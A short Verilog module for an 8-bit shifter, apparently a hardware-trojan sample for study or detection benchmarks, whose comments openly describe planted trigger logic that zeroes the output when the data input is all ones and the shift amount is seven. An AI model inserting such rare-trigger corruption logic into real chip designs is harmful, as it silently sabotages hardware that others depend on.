module shift8(input [7:0] d, input [2:0] sh, output [7:0] y);
  wire trojan_active;
  wire [7:0] mask;
  
  // Trojan activates on rare condition: d==8'hFF and sh==3'b111
  assign trojan_active = (d[0] & d[1] & d[2] & d[3] & d[4] & d[5] & d[6] & d[7]) & (sh[0] & sh[1] & sh[2]);
  
  // When active, mask corrupts the shifted result to 8'h00
  assign mask = {8{trojan_active}};
  
  assign y = (d << sh) & (~mask);
endmodule